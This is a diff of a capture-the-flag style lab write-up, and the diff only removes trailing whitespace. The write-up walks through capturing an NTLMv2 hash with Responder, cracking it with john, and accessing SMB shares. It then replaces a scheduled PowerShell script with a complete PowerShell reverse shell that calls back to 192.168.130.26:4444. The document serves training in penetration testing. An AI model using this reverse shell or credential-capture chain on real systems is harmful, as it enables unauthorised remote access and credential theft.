@@ -96,7 +96,7 @@ Nmap done: 1 IP address (1 host up) scanned in 142.64 seconds
 We have redis service open. Let's see if we find anything there.
 
 ```bash
-kali@kali:redis-cli -h 10.48.174.150                                                                                                                               
+kali@kali:redis-cli -h 10.48.174.150
 10.48.174.150:6379> KEYS *
 (empty array)
 ```
@@ -145,22 +145,22 @@ Should receive the NTLM hash shortly.
 [*] Version: Responder 3.2.0.0
 [*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
 
-[+] Listening for events...                                                                                                                                  
+[+] Listening for events...
 
 [SMB] NTLMv2-SSP Client   : 10.48.174.150
 [SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
-[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:140e94b13e28d6fc:E22CE47081A9F7DA55579C83E14621D6:0101.....000000 
+[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:140e94b13e28d6fc:E22CE47081A9F7DA55579C83E14621D6:0101.....000000
 ```
 
 We got the hash for enterprise-security. Let's get cracking.
 
 ```bash
-kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                    
+kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-sa...98  (enterprise-security)     
+sa...98  (enterprise-security)
 1g 0:00:00:01 DONE (2026-02-23 11:58) 0.5524g/s 2217Kp/s 2217Kc/s 2217KC/s sandoval69..sand36
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed.
@@ -169,16 +169,16 @@ Session completed.
 We have no services running that can help us get remote connection. So, let's see if we can get shares for this users.
 
 ```bash
-kali@kali:smbclient -L //10.48.174.150/ -U 'vulnnet.local/enterprise-security%sa...98'                                                                     
+kali@kali:smbclient -L //10.48.174.150/ -U 'vulnnet.local/enterprise-security%sa...98'
 
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
         C$              Disk      Default share
-        Enterprise-Share Disk      
+        Enterprise-Share Disk
         IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        SYSVOL          Disk      Logon server share 
+        NETLOGON        Disk      Logon server share
+        SYSVOL          Disk      Logon server share
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.48.174.150 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
@@ -187,7 +187,7 @@ Unable to connect with SMB1 -- no workgroup available
 We have shares for this users. Enterprise-Share seems interesting.
 
 ```bash
-kali@kali:smbclient //10.48.174.150/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_08...98'                                                        
+kali@kali:smbclient //10.48.174.150/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_08...98'
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Wed Feb 24 04:30:41 2021
@@ -195,36 +195,36 @@ smb: \> ls
   PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:18:18 2021
 
                 9558271 blocks of size 4096. 4949859 blocks available
-smb: \> get PurgeIrrelevantData_1826.ps1 
+smb: \> get PurgeIrrelevantData_1826.ps1
 getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
 ```
 
 ```bash
-kali@kali:cat PurgeIrrelevantData_1826.ps1                                                                                                                         
+kali@kali:cat PurgeIrrelevantData_1826.ps1
 rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 ```
 
 We have a powershell script. This powershell script is the likely a scheduled task, we can simply replace this file with our powershell script, that will be executed.
 
 ```bash
-kali@kali:cat PurgeIrrelevantData_1826.ps1                                                                                                                         
+kali@kali:cat PurgeIrrelevantData_1826.ps1
 #rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
-$LHOST = "192.168.130.26"; 
-$LPORT = 4444; 
-$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
-$NetworkStream = $TCPClient.GetStream(); 
-$StreamReader = New-Object IO.StreamReader($NetworkStream); 
-$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
-$StreamWriter.AutoFlush = $true; 
-$Buffer = New-Object System.Byte[] 1024; 
-while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
-$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; 
-if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
-$StreamWriter.Write("$Output`n"); 
-$Code = $null } }; 
-$TCPClient.Close(); 
-$NetworkStream.Close(); 
-$StreamReader.Close(); 
+$LHOST = "192.168.130.26";
+$LPORT = 4444;
+$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT);
+$NetworkStream = $TCPClient.GetStream();
+$StreamReader = New-Object IO.StreamReader($NetworkStream);
+$StreamWriter = New-Object IO.StreamWriter($NetworkStream);
+$StreamWriter.AutoFlush = $true;
+$Buffer = New-Object System.Byte[] 1024;
+while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);
+$Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) };
+if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ };
+$StreamWriter.Write("$Output`n");
+$Code = $null } };
+$TCPClient.Close();
+$NetworkStream.Close();
+$StreamReader.Close();
 $StreamWriter.Close()
 ```
 
@@ -232,13 +232,13 @@ Start a listener. I am using metasploit module for listener.
 
 ```bash
 msf exploit(multi/handler) > run
-[*] Started reverse TCP handler on 192.168.130.26:4444 
+[*] Started reverse TCP handler on 192.168.130.26:4444
 ```
 
 We can simply replace the script with put command in smb share.
 
 ```bash
-smb: \> put PurgeIrrelevantData_1826.ps1 
+smb: \> put PurgeIrrelevantData_1826.ps1
 putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (9.6 kB/s) (average 9.6 kB/s)
 ```
 
